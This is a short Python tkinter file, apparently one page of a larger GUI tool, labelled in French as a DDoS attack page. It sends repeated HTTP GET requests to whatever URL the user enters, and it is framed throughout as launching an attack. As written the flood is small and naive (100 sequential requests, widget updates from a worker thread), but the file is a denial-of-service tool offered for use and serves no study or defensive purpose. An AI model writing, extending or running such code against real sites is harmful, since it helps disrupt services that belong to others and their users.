import tkinter as tk
import requests
from threading import Thread

class DdosPage(tk.Frame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        label = tk.Label(self, text="Page DDoS", font=("Arial", 16))
        label.pack(pady=20)
        
        self.url_entry = tk.Entry(self, width=40)
        self.url_entry.pack(pady=10)
        
        self.start_button = tk.Button(self, text="Lancer l'attaque DDoS", command=self.start_attack)
        self.start_button.pack(pady=10)
        
        self.status_label = tk.Label(self, text="")
        self.status_label.pack(pady=10)
    
    def start_attack(self):
        url = self.url_entry.get()
        if url:
            self.status_label.config(text="Lancement en cours...")
            thread = Thread(target=self.ddos_attack, args=(url,))
            thread.start()
    
    def ddos_attack(self, url):
        try:
            for _ in range(100):
                requests.get(url)
            self.status_label.config(text="Attaque terminée !")
        except Exception as e:
            self.status_label.config(text=f"Erreur : {e}")
